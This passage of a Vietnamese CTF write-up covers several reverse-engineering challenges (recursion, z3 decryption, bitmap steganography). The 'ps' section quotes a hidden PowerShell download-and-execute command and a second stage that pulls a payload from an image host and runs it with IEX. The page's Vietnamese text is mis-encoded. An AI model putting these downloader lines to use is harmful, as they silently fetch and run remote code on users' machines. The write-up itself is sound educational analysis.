                        <p><a href="https://user-images.githubusercontent.com/38103453/131249486-0ff4b006-f1d1-49ce-a552-def2142ee28e.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249486-0ff4b006-f1d1-49ce-a552-def2142ee28e.PNG" alt="h0" /></a></p>
                        <p>ƒê·∫ßu ti√™n t√¥i th·∫•y trong ph·∫ßn string c√≥ m·ªôt const ƒë·∫∑c bi·ªát.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249489-f93fe869-1306-4fe3-b2ff-56b26733196f.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249489-f93fe869-1306-4fe3-b2ff-56b26733196f.PNG" alt="h1" /></a></p>
                        <p>Xref theo string n√†y, n√≥ s·∫Ω d·∫´n t·ªõi h√†m <code>sub_4014DD()</code>.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249490-fdcba66f-9e5f-4bad-97aa-e5095cbf9aea.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249490-fdcba66f-9e5f-4bad-97aa-e5095cbf9aea.PNG" alt="h2" /></a></p>
                        <p>·ªû ƒë√¢y, ta th·∫•y <code>dword_404020</code> s·∫Ω l√† m·∫£ng ch·ª©a c√°c gi√° tr·ªã ƒë·ªÉ ph·ª•c v·ª• vi·ªác t√≠nh to√°n, v√† l√†m tham s·ªë cho h√†m <code>sub_401460()</code>. K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa h√†m <code>sub_401460()</code> ƒë√≥ ch√≠nh l√† flag v√† s·∫Ω ƒë∆∞·ª£c in ra console.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249491-992160f9-6491-4d9c-b841-3d6542399b7d.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249491-992160f9-6491-4d9c-b841-3d6542399b7d.PNG" alt="h3" /></a></p>
                        <p>Ph√¢n t√≠ch v√†o h√†m <code>sub_401460()</code>, ta th·∫•y n√≥ s·ª≠ d·ª•ng ƒë·ªá quy ƒë·ªÉ t√≠nh to√°n. H·∫°n ch·∫ø c·ªßa ƒë√™ quy l√† n·∫øu s·ªë truy·ªÅn v√†o c√†ng l·ªõn th√¨ t·ªëc ƒë·ªô t√≠nh to√°n c√†ng ch·∫≠m. N√™n khi t√¥i ch·∫°y file th√¨ kh√¥ng nh·∫≠n ƒë∆∞·ª£c flag. :((</p>
                        <p>ƒê·ªÉ gi·∫£i quy·∫øt ƒë∆∞·ª£c b√†i to√°n n√†y th√¨ ch√∫ng ta s·∫Ω kh·ª≠ ƒë·ªá quy b·∫±ng c√°ch t√¨m quy lu·∫≠t c·ªßa n√≥.</p>
                        <p>H√†m n√†y quy lu·∫≠t s·∫Ω nh∆∞ sau:</p>
                        <pre><code>      a[0] = 0
                              a[1] = 1
                              a[2] = 2
                              a[3] = (75 * a[2]) + (3 * a[1]) + (17 * a[0])
                              a[4] = (75 * a[3]) + (3 * a[2]) + (17 * a[1])
                        </code></pre>
                        <p>T·ª´ ƒë√≥ ta c√≥ ƒë∆∞·ª£c script nh∆∞ b√™n d∆∞·ªõi:</p>
                        <pre><code>enc = [7, 9, 19, 5, 262, 182, 33, 112, 134, 12, 136, 55, 309, 33, 239, 84, 405, 55, 121, 84, 215, 33, 134, 12, 239, 33, 23, 239, 23, 379, 309, 37, 41]
                        flag = &quot;&quot;
                        for i_enc in range(len(enc)):
                            data = [0 for i in range(enc[i_enc] + 1)]
                            for i in range(0, enc[i_enc] + 1):
                                if i == 0:
                                    data[0] = 0
                                elif i == 1:
                                    data[1] = 1
                                elif i == 2:
                                    data[2] = 2
                                else:
                                    data[i] = (75 * data[i - 1]) + (3 * data[i - 2]) + (17 * data[i - 3])
                            flag += chr(data[enc[i_enc]] &amp; 0xFF)
                        
                        print(flag)
                        </code></pre>
                        <p>Flag l√†: <code>KMA{pH180n4Cc1_r3CurS10n_1s_sUck}</code></p>
                        <h3>Encryptor</h3>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249492-0f52c00b-0370-4e34-a8c9-fb0167cc3648.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249492-0f52c00b-0370-4e34-a8c9-fb0167cc3648.PNG" alt="h4" /></a></p>
                        <p>ƒê√¢y l√† m·ªôt ch∆∞∆°ng tr√¨nh m√£ h√≥a file. Load v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249495-97e21f68-22b0-4fd7-9d08-b7aaff1e1eb0.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249495-97e21f68-22b0-4fd7-9d08-b7aaff1e1eb0.PNG" alt="h5" /></a></p>
                        <p>H√†m <code>main()</code> ch∆∞∆°ng tr√¨nh g·ªìm 3 h√†m:</p>
                        <ul>
                        <li>
                        <code>f_open_file()</code> s·∫Ω th·ª±c hi·ªán m·ªü, ƒë·ªçc file v√† l∆∞u data v√†o memory, ƒë·ªãa ch·ªâ c·ªßa memory n√†y s·∫Ω l∆∞u v√†o bi·∫øn <strong>argc</strong>
                        </li>
                        <li>
                        <code>f_encrypt_file()</code> m√£ h√≥a data</li>
                        <li>
                        <code>f_save_encrypted_file()</code> l∆∞u encrypted data v√†o file v·ªõi ƒë∆∞·ªùng d·∫´n l√† file g·ªëc + &quot;.encrypt&quot; extension.</li>
                        </ul>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249496-57469c90-ed69-40c4-80ed-8d47269e020f.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249496-57469c90-ed69-40c4-80ed-8d47269e020f.PNG" alt="h6" /></a></p>
                        <p>T√¥i ti·∫øn h√†nh ph√¢n t√≠ch s√¢u v√†o <code>f_encrypt_file()</code>. T√¥i th·∫•y m·ªói l·∫ßn m√£ h√≥a 8 bytes. Cu·ªëi c√πng data m√£ h√≥a ƒë√≥ s·∫Ω ƒë∆∞·ª£c l∆∞u l·∫°i v√†o bi·∫øn <code>data</code> b·∫±ng h√†m <code>memmove()</code>.</p>
                        <p>T·ª´ ƒë√¢y t√¥i s·∫Ω vi·∫øt script ƒë·ªÉ decrypt l·∫°i file b·∫±ng <strong>z3</strong> python.</p>
                        <pre><code>from z3 import *
                        
                        with open(&quot;flag.jpg.encrypt&quot;, &quot;rb&quot;) as f:
                            enc = f.read()
                        
                        data = [0 for i in range(len(enc))]
                        
                        for i_len_enc in range(0, len(enc) - 1, 8):
                        
                            inp = [BitVec(&quot;%d&quot; % i, 8) for i in range(8)]
                            s = Solver()
                            rs = 0
                        
                            for i in range(0, 8):
                                rs = 0
                                for j in range(0, 8):
                                    rs += ((inp[j] &gt;&gt; i) &amp; 1) &lt;&lt; j
                                rs = 0xFF - (rs &amp; 0xFF) + 1
                        
                                s.add(rs == enc[i_len_enc + i])
                        
                            if s.check() == sat:
                                flag = []
                                m = s.model()
                                md = sorted([(d, m[d]) for d in m], key = lambda x: str(x[0]))
                                for i in md:
                                    flag.append(i[1].as_long())
                                for i in range(0, 8):
                                    data[i_len_enc + i] = flag[i]
                        
                        with open(&quot;flag.jpg&quot;, &quot;wb&quot;) as f:
                            f.write(bytearray(data))
                        
                        print(&quot;Done!&quot;)
                        </code></pre>
                        <p>Flag l√†: <code>KMA{Encryp7_w17H0u7_x0r}</code></p>
                        <h3>Amazing Good Mood</h3>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249498-353caf0f-4804-47a5-af33-a228f69be3a5.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249498-353caf0f-4804-47a5-af33-a228f69be3a5.PNG" alt="h7" /></a></p>
                        <p>Theo nh∆∞ d·∫°ng ƒë·ªÅ n√†y, t√¥i m·∫°nh d·∫°ng ƒëo√°n l√† flag ƒë√£ ƒë∆∞·ª£c gi·∫•u v√†o c√°c pixel c·ªßa ·∫£nh :))</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249499-1444c5b7-c03b-448f-88c6-5ed3188fc677.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249499-1444c5b7-c03b-448f-88c6-5ed3188fc677.PNG" alt="h8" /></a></p>
                        <p>Load file v√†o <strong>CFF Explore</strong> th√¨ t√¥i nh·∫≠n ra file ƒë∆∞·ª£c vi·∫øt b·∫±ng <strong>C#</strong>.</p>
                        <p>Load file v√†o <strong>dnSpy</strong> ƒë·ªÉ ph√¢n t√≠ch.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249500-64674cdc-b73a-4613-867e-1f9abc5b5b31.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249500-64674cdc-b73a-4613-867e-1f9abc5b5b31.PNG" alt="h9" /></a></p>
                        <p>T·∫°i h√†m <code>main()</code>, ta th·∫•y ch∆∞∆°ng tr√¨nh y√™u c·∫ßu 3 tham s·ªë: ƒê∆∞·ªùng d·∫´n file bitmap g·ªëc, ƒë∆∞·ªùng d·∫´n file ch·ª©a secret c·∫ßn gi·∫•u v√†o ·∫£nh, ƒë∆∞·ªùng d·∫´n file bitmap s·∫Ω ƒë∆∞·ª£c l∆∞u.</p>
                        <p>Ta ch√∫ √Ω t·∫°i d√≤ng 172 v√† 173, s·∫Ω d√πng ƒë·ªÉ l·∫•y c√°c bytes secret v√† ki·ªÉm tra chi·ªÅu d√†i secret ph·∫£i b·∫±ng 24.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249501-009b9d36-a3ad-4c44-bde4-8fd6ef75dc9f.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249501-009b9d36-a3ad-4c44-bde4-8fd6ef75dc9f.PNG" alt="h10" /></a></p>
                        <p>H√†m <code>Program.h()</code> s·∫Ω l√†m nhi·ªám v·ª• m√£ h√≥a secret, t√¥i nh·∫≠n ra ƒë√¢y l√† m√£ h√≥a <strong>RC4</strong>.</p>
                        <p>Key s·∫Ω ƒë∆∞·ª£c decode <strong>base64</strong> c·ªßa bi·∫øn <code>Program.yy</code>.</p>
                        <p>ƒê·∫∑c bi·ªát ch√∫ √Ω, <strong>nh·∫•n chu·ªôt ph·∫£i -&gt; Analyze</strong>, ta s·∫Ω th·∫•y bi·∫øn n√†y c√≤n ƒë∆∞·ª£c s·ª≠ d·ª•ng t·∫°i h√†m <code>Program.Init()</code>.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249502-19a9da6b-4295-441e-9973-a599b71360d7.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249502-19a9da6b-4295-441e-9973-a599b71360d7.PNG" alt="h11" /></a></p>
                        <p>H√†m n√†y ƒë∆∞·ª£c g·ªçi ·ªü ƒë·∫ßu h√†m <code>main()</code>, n√≥ th·ª±c hi·ªán ki·ªÉm tra debug b·∫±ng h√†m <code>IsDebuggerPresent()</code>. N·∫øu ƒë√∫ng th√¨ s·∫Ω gh√©p th√™m chu·ªói <code>QDIwMjI=</code> v√†o bi·∫øn <code>Program.yy</code>, ng∆∞·ª£c l·∫°i th√¨ gh√©p th√™m chu·ªói <code>QDEyMzQ=</code>.</p>
                        <p>T·ª´ ƒë√¢y ta c√≥ th·ªÉ decode base64 chu·ªói <code>S01BQ1RGQDEyMzQ=</code> s·∫Ω ƒë∆∞·ª£c key l√† <code>KMACTF@1234</code>.</p>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249504-ea793a7c-d9f1-4b1b-9bad-bfc233223cd7.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249504-ea793a7c-d9f1-4b1b-9bad-bfc233223cd7.PNG" alt="h12" /></a></p>
                        <p>Sau khi m√£ h√≥a secret. H√†m <code>Program.j()</code> s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ gi·∫•u encrypted secret theo quy t·∫Øc nh∆∞ sau:</p>
                        <ul>
                        <li>
                        <strong>red</strong>: s·∫Ω gi·ªØ 3 bit t√≠nh t·ª´ bit th·∫•p nh·∫•t</li>
                        <li>
                        <strong>green</strong>: s·∫Ω gi·ªØ 3 bit ti·∫øp theo</li>
                        <li>
                        <strong>blue</strong>: s·∫Ω gi·ªØ 3 bit c√≤n l·∫°i</li>
                        </ul>
                        <p>T·ª´ nh·ªØng g√¨ t√¥i ph√¢n t√≠ch, t√¥i s·∫Ω vi·∫øt m·ªôt ƒëo·∫°n C# ƒë·ªÉ dump c√°c pixel t·ª´ file <code>encrypted.bmp</code> sau ƒë√≥ ph·ª•c h·ªìi l·∫°i encrypted secret. Cu·ªëi c√πng s·∫Ω decrypt b·∫±ng <strong>RC4</strong>.</p>
                        <pre><code>static void Main(string[] args)
                        {
                              Bitmap image1 = new Bitmap(&quot;C:\\Users\\ChiThanh\\Desktop\\kmactf\\re\\encrypted.bmp&quot;);
                              int x, y;
                              int z = 0;
                        
                              for (x = 0; x &lt; image1.Width; x++)
                              {
                                     for (y = 0; y &lt; image1.Height; y++)
                                     {   
                                           if (z &gt;= 24) {
                                                 System.Environment.Exit(0);
                                           }
                                           z += 1;
                                           Color pixelColor = image1.GetPixel(x, y);
                                           int result = (pixelColor.R &lt;&lt; 6) + (pixelColor.G &lt;&lt; 3) + pixelColor.B;
                                           Console.Write(result.ToString(&quot;X2&quot;));
                                     }
                              }
                        }
                        </code></pre>
                        <p>Flag l√† <code>KMA{d0nT_tRu$t_m3_hihi!}</code></p>
                        <h3>ps</h3>
                        <p><a href="https://user-images.githubusercontent.com/38103453/131249505-f142dc8b-d335-494c-bb2d-3e831884c9e4.PNG"><img src="https://user-images.githubusercontent.com/38103453/131249505-f142dc8b-d335-494c-bb2d-3e831884c9e4.PNG" alt="h13" /></a></p>
                        <p>Nh√¨n v√†o file <code>ps</code> th√¨ t√¥i x√°c ƒë·ªãnh ƒë√¢y l√† m·ªôt shortcut. Th∆∞·ªùng m·ªôt s·ªë malware c≈©ng hay s·ª≠ d·ª•ng c√°ch n√†y ƒë·ªÉ download payload v·ªÅ. V√¨ v·∫≠y t√¥i s·∫Ω v√†o Property ƒë·ªÉ ki·ªÉm tra target c·ªßa n√≥.</p>
                        <pre><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c &quot;(New-Object Net.WebClient).DownloadString('https://drive.google.com/u/0/uc?id=1rzjAbtVnylBuOL4hSdp60fGZ24Od7DCV&amp;export=download') | iex&quot;
                        </code></pre>
                        <p>Ch√∫ng ta th·∫•y shortcut n√†y d√πng script c·ªßa Powershell ƒë·ªÉ download file v·ªÅ th·ª±c thi. T√¥i s·∫Ω download file v·ªÅ ƒë·ªÉ ph√¢n t√≠ch.</p>
                        <pre><code>sal a New-Object;
                        Add-Type -A System.Drawing;
                        $g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(&quot;https://i.ibb.co/FmsX0Bx/payload.png&quot;));
                        $o = a Byte[] 2221;
                        (0..0) | % {
                           foreach ($x in (0..2220)) {
                             $p = $g.GetPixel($x, $_);
                             $o[$_ * 2221 + $x] = ([math]::Floor(($p.B -band 15) *  16) -bor ($p.G -band 15))
                           }
                        };
                        IEX([System.Text.Encoding]::ASCII.GetString($o[0..1417]))
                        </code></pre>
                        <p>File download v·ªÅ c≈©ng l√† m·ªôt Powershell script, script n√†y th·ª±c hi·ªán vi·ªác download payload v·ªÅ, sau ƒë√≥ gi·∫£i m√£ payload ƒë√≥. Cu·ªëi c√πng s·∫Ω th·ª±c thi payload ƒë√≥.</p>
                        <p>ƒê·ªÉ c√≥ th·ªÉ ti·∫øp t·ª•c ph√¢n t√≠ch, t√¥i ƒë√£ s·ª≠a l·∫°i script nh∆∞ b√™n d∆∞·ªõi, sau ƒë√≥ upload l√™n drive, s·ª≠a l·∫°i link trong target c·ªßa shortcut v√† th·ª±c thi l·∫°i <code>ps</code> shortcut.</p>
                        <pre><code>sal a New-Object;
                        Add-Type -A System.Drawing;
                        $g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(&quot;https://i.ibb.co/FmsX0Bx/payload.png&quot;));
                        $o = a Byte[] 2221;
                        (0..0) | % {
                           foreach ($x in (0..2220)) {
                             $p = $g.GetPixel($x, $_);
                             $o[$_ * 2221 + $x] = ([math]::Floor(($p.B -band 15) *  16) -bor ($p.G -band 15))
                           }
                        };
                        [System.Text.Encoding]::ASCII.GetString($o[0..1417]) | Out-File -FilePath .\Payload.txt
                        </code></pre>
                        <p>Sau khi th·ª±c thi, ta c√≥ ƒë∆∞·ª£c file <code>Payload.txt</code>.</p>
                        <pre><code>[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;JFI9eyRELCRLPSRBcmdzOyRTPTAuLjI1NTswLi4yNTV8JXskSj0oJEorJFNbJF9dKyRLWyRfJSRLLkxlbmd0aF0pJTI1NjskU1skX10sJFNbJEpdPSRTWyRKXSwkU1skX119OyREfCV7JEk9KCRJKzEpJTI1NjskSD0oJEgrJFNbJEldKSUyNTY7JFNbJEldLCRTWyRIXT0kU1skSF0sJFNbJEldOyRfLWJ4b3IkU1soJFNbJEldKyRTWyRIXSklMjU2XX19O1t2b2lkXVtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiTWljcm9zb2Z0LlZpc3VhbEJhc2ljIik7JEluID0gKFtzeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgpLkdldEJ5dGVzKFtNaWNyb3NvZnQuVmlzdWFsQmFzaWMuSW50ZXJhY3Rpb25dOjpJbnB1dEJveCggIkVudGVyIGZsYWc6IiwiU2ltcGxlIENyYWNrbWUiKSk7W2J5dGVbXV0gJEsgPSAxMTksNzIsMTIxLDk1LDg5LDQ4LDExNyw5NSw5OCw4NSw0OSw0OSw4OSw5NSwxMDksNTE7W2J5dGVbXV0gJEQgPSA0OSw2Nyw1Nyw0OSw2NSw0OSw1Niw2Niw2Nyw2OCw0OCw1NSw1Niw1Miw3MCw1Myw1NCw1NSw1Niw2NSw1MCw1Nyw2OCw1NSw1MSw1NCw1Miw1MCw3MCw1Nyw2Niw1NSw2OCw2Nyw1Nyw1Nyw3MCw1NCw2NSw1MSw1Miw1NCw2Niw1Miw2OSw2OCw1MSw2Niw1MCw0OCw0OCw1Nyw2OCw2NSw1MSw2OCw1NSw1NSw2Nyw0OSw1NSw1MCw1NCw2Nyw1Niw2NTskViA9ICgmICRSICRJbiAkS3wgRm9yRWFjaC1PYmplY3QgeyAiezA6WDJ9IiAtZiAkXyB9KSAtam9pbiAnJztpZihbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJEQpIC1lcSAkVil7W01pY3Jvc29mdC5WaXN1YWxCYXNpYy5JbnRlcmFjdGlvbl06Ok1zZ0JveCgiQ29ycmVjdCEiLCAiT2tPbmx5LFN5c3RlbU1vZGFsLEluZm9ybWF0aW9uIiwgIlN1Y2Nlc3MiKX1lbHNle1tNaWNyb3NvZnQuVmlzdWFsQmFzaWMuSW50ZXJhY3Rpb25dOjpNc2dCb3goIkluY29ycmVjdCEiLCAiT2tPbmx5LFN5c3RlbU1vZGFsLEV4Y2xhbWF0aW9uIiwgIkVycm9yIil9&quot;)) | iex
                        </code></pre>
                        <p>Decode base64, ta ƒë∆∞·ª£c ƒëo·∫°n script nh∆∞ b√™n d∆∞·ªõi:</p>
                        <pre><code>$R={       # RC4 function
                            $D, $K = $Args;
                            $S = 0..255;
                            0..255 | %   # KSA
                            {
                                $J = ($J + $S[$_] + $K[$_ % $K.Length]) % 256;
                                $S[$_], $S[$J] = $S[$J], $S[$_]           # swap
                            };
                            $D | %     # PRGA
                            { 
                                $I = ($I + 1) % 256;
                                $H = ($H + $S[$I]) % 256;
                                $S[$I], $S[$H] = $S[$H], $S[$I];
                                $_ -bxor $S[($S[$I] + $S[$H]) % 256]
                            }
                        };
                        
                        [void][Reflection.Assembly]::LoadWithPartialName(&quot;Microsoft.VisualBasic&quot;);
                        
                        $In = ([system.Text.Encoding]::UTF8).GetBytes([Microsoft.VisualBasic.Interaction]::InputBox( &quot;Enter flag:&quot;,&quot;Simple Crackme&quot;));
                        
                        [byte[]] $K = 119,72,121,95,89,48,117,95,98,85,49,49,89,95,109,51;
                        [byte[]] $D = 49,67,57,49,65,49,56,66,67,68,48,55,56,52,70,53,54,55,56,65,50,57,68,55,51,54,52,50,70,57,66,55,68,67,57,57,70,54,65,51,52,54,66,52,69,68,51,66,50,48,48,57,68,65,51,68,55,55,67,49,55,50,54,67,56,65;
                        
                        $V = (&amp; $R $In $K| ForEach-Object { &quot;{0:X2}&quot; -f $_ }) -join '';
                        
                        if([System.Text.Encoding]::ASCII.GetString($D) -eq $V){
                            [Microsoft.VisualBasic.Interaction]::MsgBox(&quot;Correct!&quot;, &quot;OkOnly,SystemModal,Information&quot;, &quot;Success&quot;)
                        }
                        else{
                            [Microsoft.VisualBasic.Interaction]::MsgBox(&quot;Incorrect!&quot;, &quot;OkOnly,SystemModal,Exclamation&quot;, &quot;Error&quot;)
                        }
                        </code></pre>
                        <p>C√°ch ho·∫°t ƒë·ªông c·ªßa script s·∫Ω nh∆∞ sau:</p>
                        <ul>
                        <li>Bi·∫øn <code>$In</code> s·∫Ω ch·ª©a chu·ªói flag nh·∫≠p v√†o</li>
                        <li>
                        <code>InputBox( &quot;Enter flag:&quot;,&quot;Simple Crackme&quot;));</code> s·∫Ω m·ªü m·ªôt box ƒë·ªÉ ng∆∞·ªùi d√πng nh·∫≠p flag</li>
                        <li>Bi·∫øn <code>$K</code> s·∫Ω l√† m·∫£ng key ƒë·ªÉ m√£ h√≥a flag</li>
                        <li>Bi·∫øn <code>$D</code> s·∫Ω l√† m·∫£ng flag ƒë√£ b·ªã m√£ h√≥a</li>
                        <li>
                        <code>$V = (&amp; $R $In $K| ForEach-Object { &quot;{0:X2}&quot; -f $_ }) -join '';</code> th·ª±c hi·ªán vi·ªác g·ªçi h√†m <code>$R</code> v·ªõi tham s·ªë l√† <code>$In</code> v√† <code>$K</code>. K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa h√†m s·∫Ω ƒë∆∞·ª£c chuy·ªÉn sang chu·ªói c√°c k√≠ t·ª± hexa v√† l∆∞u v√†o bi·∫øn <code>$V</code>
                        </li>
                        <li>
                        <code>[System.Text.Encoding]::ASCII.GetString($D) -eq $V</code> d√πng ƒë·ªÉ so s√°nh bi·∫øn <code>$D</code> v√† <code>$V</code>
                        </li>
                        <li>H√†m <code>$R</code> l√† h√†m m√£ h√≥a <strong>RC4</strong>, v·ªõi <code>$D</code> l√† flag v√† <code>$K</code> l√† key</li>
                        </ul>
                        <p>T·ªõi ƒë√¢y, t√¥i c√≥ th·ªÉ decrypt <strong>RC4</strong> v·ªõi <code>key=7748795f5930755f62553131595f6d33</code>, <code>enc=1C91A18BCD0784F5678A29D73642F9B7DC99F6A346B4ED3B2009DA3D77C1726C8A</code>.</p>
                        <p>Flag l√†: <code>KMA{-----&gt;fiL3L355_mALwar3&lt;-----}</code></p>
                        
                </div>
            </div>
        </div>
        <div id="footer">
            <div class="footer-contaner">
                <div class="logo-container">
                    <div class="school-logo">
                        <a href="/index.html"><img src="/asset/img/club_logo.jpg" alt=""></a>
                        <a href="https://actvn.edu.vn/"><img src="/asset/img/school_logo.png" alt=""></a>
                    </div>
                    <div class="social-media">
                        <a href="https://www.facebook.com/kmase.club"><i class="fa-brands fa-facebook"></i></a>
                        <a href="https://github.com/kcsc-club"><i class="fa-brands fa-github"></i></a>
                        <a href="mailto:kmase.club@gmail.com"><i class="fa-brands fa-google"></i></a>
                        <a href=""><i class="fa-brands fa-tiktok"></i></a>
                    </div>
                </div>
                <div class="footer-info">
                    <p>POWER BY KCSC</p>
                    <p>CONTACT US</p>
                </div>
            </div>
        </div>
    </div>
    <script src="/asset/js/responsive.js"></script>
</body>
</html>